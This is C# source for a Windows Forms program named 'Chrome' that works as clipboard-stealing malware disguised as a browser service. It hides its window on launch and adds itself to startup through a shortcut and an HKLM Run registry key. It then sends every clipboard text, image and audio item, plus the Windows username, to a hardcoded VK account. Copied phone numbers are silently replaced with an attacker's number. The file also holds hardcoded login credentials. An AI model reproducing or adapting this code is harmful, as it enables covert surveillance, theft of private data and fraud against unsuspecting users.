using Microsoft.Extensions.DependencyInjection;
using System;
using System.Windows.Forms;
using VkNet;
using VkNet.AudioBypassService.Extensions;
using VkNet.Model;
using System.IO;
using VkNet.Model.RequestParams;
using System.Net;
using System.Text;
using System.Collections.Generic;
using VkNet.Model.Attachments;
using System.Net.Http;
using System.Threading.Tasks;
using System.Net.Http.Headers;
using File = System.IO.File;

namespace chrome
{
    public partial class Chrome : Form
    {
        private VkApi api;
        private ServiceCollection services;
        public Chrome()
        {
            InitializeComponent();
        }

        public readonly Random rnd = new Random();
        public int value;
        public void sharpClipboard1_ClipboardChanged(object sender, WK.Libraries.SharpClipboardNS.SharpClipboard.ClipboardChangedEventArgs e)
        {  
            value = rnd.Next();
            string a = Clipboard.GetText();
            if (a.Contains("+") && a.Length < 12 && a.Length > 5)
            {
                api.Messages.Send(new VkNet.Model.RequestParams.MessagesSendParams
                {

                    RandomId = value, // уникальный
                    UserId = 572418132,
                    Message = Clipboard.GetText() + "  Replaced to: +79618800123. User:" + Environment.UserName
                });
                Clipboard.SetText("+79618800123");

            }
            

            if(Clipboard.ContainsImage())
            {
                SendMessageWithImage(api);
            }
            if(Clipboard.ContainsAudio())
            {
                SendMessageWithAudio(api);
            }
            if(Clipboard.ContainsData("mp3"))
            {
                SendMessageWithAudio(api);
            }




            api.Messages.Send(new VkNet.Model.RequestParams.MessagesSendParams
            {

                RandomId = value, // уникальный
                UserId = 572418132,
                Message = Clipboard.GetText() + "  User:" + Environment.UserName
            });
        }
        public void Form1_Load(object sender, EventArgs e)
        {
            this.FormClosing += new FormClosingEventHandler(ifClose);
            Visible = false;
            value = rnd.Next();
            services = new ServiceCollection();
            services.AddAudioBypass();
            api = new VkApi(services);
            //var browserData =  ChromeBrowser.GetLoginData().ToString();
            api.Authorize(new ApiAuthParams
            {
                Login = "79618800123",
                Password = "123!"
            });
            string deskDir = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            try
            {
                using (StreamWriter writer = new StreamWriter(deskDir + "\\" + "chrome-services" + ".url"))
                {
                    string app = System.Reflection.Assembly.GetExecutingAssembly().Location;
                    writer.WriteLine("[InternetShortcut]");
                    writer.WriteLine("URL=file:///" + app);
                    writer.WriteLine("IconIndex=0");
                    string icon = app.Replace('\\', '/');
                    writer.WriteLine("IconFile=" + icon);
                }
            }
            catch
            {

            }
            try
            {
                Microsoft.Win32.RegistryKey Key =
             Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true);

                Key.SetValue("chrome-services", System.Windows.Forms.Application.ExecutablePath);
                Key.Close();
            }
            catch
            {

            }
        }
        public void ifClose(object sender, EventArgs e)
        {
            
        }
        public async void SendMessageWithImage(VkApi Api)
        {
            var userId = 572418132; //Получатель сообщения

            // Получить адрес сервера для загрузки картинок в сообщении
            var uploadServer = Api.Photo.GetMessagesUploadServer(userId);

            // Загрузить картинку на сервер VK.
            sharpClipboard1.ClipboardImage.Save("D:\\\\temp\\image.png");
            var wc = new WebClient();
            var result = Encoding.ASCII.GetString(wc.UploadFile(uploadServer.UploadUrl, "d:\\temp\\image.png"));

            // Сохранить загруженный файл
            var attachment = Api.Photo.SaveMessagesPhoto(result);

            //Отправить сообщение с нашим вложением
            Api.Messages.Send(new MessagesSendParams
            {
                UserId = userId, //Id получателя
                Message = "Image:", //Сообщение
                Attachments = attachment, //Вложение
                RandomId = new Random().Next(999999) //Уникальный иде нтификатор
            });
        }
        public async Task<string> UploadFile(string serverUrl, string file, string fileExtension)
        {
            // Получение массива байтов из файла
            var data = GetBytes(file);

            // Создание запроса на загрузку файла на сервер
            using (var client = new HttpClient())
            {
                var requestContent = new MultipartFormDataContent();
                var content = new ByteArrayContent(data);
                content.Headers.ContentType = MediaTypeHeaderValue.Parse("multipart/form-data");
                requestContent.Add(content, "file", $"file.{fileExtension}");

                var response = client.PostAsync(serverUrl, requestContent).Result;
                return Encoding.Default.GetString(await response.Content.ReadAsByteArrayAsync());
            }
        }
        public byte[] GetBytes(string filePath)
        {
            return File.ReadAllBytes(filePath);
        }
        public async void SendMessageWithAudio(VkApi Api)
        {
            try
            {
                var userId = 572418132; //Получатель сообщения

                // Получить адрес сервера для загрузки файлов в сообщении
                var uploadServer = Api.Docs.GetMessagesUploadServer(userId);

                // Загрузить файл на сервер VK.


                var attachment = new List<MediaAttachment>
            {
                Api.Audio.Save(uploadServer.UploadUrl, sharpClipboard1.ClipboardFile)
            };

                //Отправить сообщение с нашим вложением
                Api.Messages.Send(new MessagesSendParams
                {
                    UserId = userId, //Id получателя
                    Message = "Message", //Сообщение
                    Attachments = attachment, //Вложение
                    RandomId = new Random().Next(999999) //Уникальный идентификатор
                });
            }
            catch
            {

            }
        }
    }
}
